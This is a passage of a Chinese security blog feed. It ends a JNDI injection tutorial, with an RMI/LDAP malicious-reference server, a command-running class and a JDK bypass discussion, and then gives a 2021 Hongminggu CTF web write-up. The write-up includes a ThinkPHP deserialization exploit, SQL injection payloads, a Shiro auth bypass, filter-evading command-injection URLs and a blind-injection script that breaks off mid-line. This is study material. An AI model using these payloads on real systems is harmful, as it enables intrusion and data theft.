class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;ExecTest&quot;</span>, <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/aa&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> ExecTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把编译好的ExecTest.class文件放到web目录下</p><p><img src="https://www.hualigs.cn/image/607a712f07b8b.jpg"></p><p>启用web服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 -m http.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607a712f0c50e.jpg"></p><p>在IDEA里执行SERVER和CLIENT，成功弹出计算器</p><p><img src="https://www.hualigs.cn/image/607a71313dd35.jpg"></p><h1 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h1><p>除了RMI服务外，JNDI还可以对接LDAP服务，只需要把lookup的地址改成<code>ldap://</code>即可，同样可以从攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>适用版本</p><p>小于JDK 11.0.1、8u191、7u201、6u211（之后com.sun.jndi.ldap.object.trustURLCodebase属性值被调整为false）</p><p>这里使用工具来搭建ldap服务端 <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>安装过程</p><p><a href="https://www.cnblogs.com/cute-puli/p/14373826.html">https://www.cnblogs.com/cute-puli/p/14373826.html</a></p><p><a href="https://blog.csdn.net/qq_43968080/article/details/105586109">https://blog.csdn.net/qq_43968080/article/details/105586109</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;#ExecTest</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607a7130023a8.jpg"></p><p>跟之前一样开启http服务并把恶意类class文件复制到目录下</p><p><img src="https://www.hualigs.cn/image/607a71307a7c9.jpg"></p><p><img src="https://www.hualigs.cn/image/607a71305d929.jpg"></p><p>CLIENT.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;ldap://192.168.111.129:1389/ExecTest&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://www.hualigs.cn/image/607a71316d72c.jpg"></p><h1 id="绕过高版本限制"><a href="#绕过高版本限制" class="headerlink" title="绕过高版本限制"></a>绕过高版本限制</h1><p>版本大于<code>JDK 11.0.1、8u191、7u201、6u211</code>时，之前这些利用方式都已经失效。但是仍然可以绕过</p><p>两种绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</span><br><span class="line"></span><br><span class="line">2.利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 </span><br></pre></td></tr></table></figure><p>主要依靠受害者本地<code>CLASSPATH</code>中的类，需要利用受害者本地的<code>Gadget</code>进行攻击。</p><p>参考：</p><p><a href="https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/">https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://xz.aliyun.com/t/6633">https://xz.aliyun.com/t/6633</a></p><p><a href="https://www.anquanke.com/post/id/221917#h3-2">https://www.anquanke.com/post/id/221917#h3-2</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2021红明谷ctf web部分复现</title>
    <link href="/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="easytp"><a href="#easytp" class="headerlink" title="easytp"></a>easytp</h1><p>报错得到thinkphp版本为3.2.3</p><p><img src="https://www.hualigs.cn/image/607984ad62c03.jpg"></p><p>存在备份文件<a href="http://www.zip/">www.zip</a></p><p><img src="https://www.hualigs.cn/image/607984b1ae704.jpg"></p><p>控制器中存在unserialize函数，需要利用反序列化漏洞</p><p><img src="https://www.hualigs.cn/image/607984addb770.jpg"></p><p>Thinkphp3.2.3反序列化漏洞（注入&amp;文件读取）</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32)),0)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用后得到当前数据库为mysql，需要查询其他数据库</p><p><img src="https://www.hualigs.cn/image/607984b31e8ea.jpg"></p><p>发现test数据库</p><p><img src="https://www.hualigs.cn/image/607984b3bab18.jpg"></p><p>查询表名，发现flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;test&#39;),1,32)),0)#</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607984b43f636.jpg"></p><p>查询flag，由于updatexml只能读取32位，需要分两次读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)#</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607984b433511.jpg"></p><p>读取后面的flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),32,32)),0)#</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607984b2c7943.jpg"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c85503e-ea45-4bfe-ac62-3f2a27998348&#125;</span><br></pre></td></tr></table></figure><h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><p>访问/login，发现Set-Cookie中存在remeberMe，判断是shiro框架</p><p><img src="https://www.hualigs.cn/image/607984b1ea813.jpg"></p><p>存在/json，但是需要登陆才能访问</p><p><img src="https://www.hualigs.cn/image/607984b0608bb.jpg"></p><p>利用Apache Shiro 身份验证绕过漏洞 CVE-2020-11989</p><p><a href="https://www.cnblogs.com/backlion/p/14055275.html">https://www.cnblogs.com/backlion/p/14055275.html</a></p><p>输入<code>/;/json</code>，成功登陆，提示需要json字符串</p><p><img src="https://www.hualigs.cn/image/607984b1af091.jpg"></p><p>测试发现可以反序列化</p><p><img src="https://www.hualigs.cn/image/607984b06b2e1.jpg"></p><p>在vps中看到回显</p><p><img src="https://www.hualigs.cn/image/607984b1369ef.jpg"></p><p>jackson反序列化，利用工具 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p><img src="https://www.hualigs.cn/image/607984b1bafe3.jpg"></p><p>Spring利用链，直接利用工具即可</p><p><img src="https://www.hualigs.cn/image/607984b2acd79.jpg"></p><p><img src="https://www.hualigs.cn/image/607984b1086e8.jpg"></p><p>成功带出flag</p><p><img src="https://www.hualigs.cn/image/607984b0513b6.jpg"></p><h1 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>反引号执行命令，空格被过滤，使用<code>$IFS</code>绕过，也可以用<code>%09</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\$IFS\$9&#x2F;&#96;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607984ad4ca06.jpg"></p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\$IFS\$9\&#96;echo\$IFS\$9LyF3aGF0eW91d2FudGdnZ2dnZ2c0MDEucGhw|base64\$IFS\$9-d\&#96;&#96;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607984ad5bb46.jpg"></p><h1 id="happsql"><a href="#happsql" class="headerlink" title="happsql"></a>happsql</h1><p>布尔盲注。可以使用<code>regexp盲注</code>和<code>exp报错盲注</code>，后面还需要用到无列名注入的知识。</p><p>regexp盲注，由于^被过滤，所以需要使用十六进制编码绕过，题目中过滤了information_schema，需要先读取mysql.innodb_table_stats来获得表名然后再进行无列名注入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-,.&quot;</span>:</span><br><span class="line">    <span class="comment"># for i in string.printable:</span></span><br><span class="line">        url = <span class="string">&quot;http://eci-2ze6jljai3r428c1jf6q.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;cache-control&#x27;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Postman-Token&#x27;</span>: <span class="string">&quot;21b59b79-a818-4fd1-a908-3112b45f9fc6&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 10.</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/version())/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;, &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        <span class="comment"># ctf,f1ag,</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;,</span></span><br><span class="line">        <span class="comment">#     &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span 